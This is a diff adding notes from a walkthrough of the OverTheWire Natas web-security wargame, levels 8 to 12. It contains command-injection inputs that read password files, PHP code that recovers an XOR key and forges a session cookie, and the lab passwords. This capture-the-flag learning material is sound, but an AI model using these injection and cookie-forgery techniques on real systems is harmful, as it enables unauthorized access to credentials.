@@ -102,14 +102,121 @@ level 8-9
 
 http://natas8.natas.labs.overthewire.org/
 
+<?php 
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+echo base64_decode(strrev(hex2bin($encodedSecret)))
+?>
+
+
+oubWYf2kBq
+
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+level 9-10
+
+
+http://natas9.natas.labs.overthewire.org/
+
+. /etc/natas_webpass/natas10 #
+
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+level 10-11
+
+http://natas10.natas.labs.overthewire.org/
+
+For security reasons, we now filter on certain characters
+
+. /etc/natas_webpass/natas11 #
+
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+level 11-12
 
+http://natas11.natas.labs.overthewire.org
+
+Cookies are protected with XOR encryption
+GET /?bgcolor=%23ffffff HTTP/1.1
+Host: natas11.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxMTpVODJxNVRDTU1ROXh1Rm9JM2RZWDYxczdPWkQ5SktvSw==
+natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+<?php
+function xor_encrypt($text) {
+    // Default cookie is ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
+    $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
+    $outText = '';
+
+    for($i=0;$i<strlen($text);$i++) {
+       $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+print xor_encrypt(json_encode($data));
+?>
+
+
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+
+qw8J recurring key is qw8J
+
+
+<?php
+function xor_encrypt($text) {
+    $key = 'qw8J';
+    $outText = '';
+
+    for($i=0;$i<strlen($text);$i++) {
+       $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+print base64_encode(xor_encrypt(json_encode($data)));
+?>
+
+ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw= default cookie
+
+
+
+<?php
+function xor_encrypt($text) {
+    $key = 'qw8J';
+    $outText = '';
+
+    for($i=0;$i<strlen($text);$i++) {
+       $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$data = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
+print base64_encode(xor_encrypt(json_encode($data)));
+?>
+
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+
+send this cookie with repeater
+
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+level 12-13
+
+http://natas12.natas.labs.overthewire.org/
+
+
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
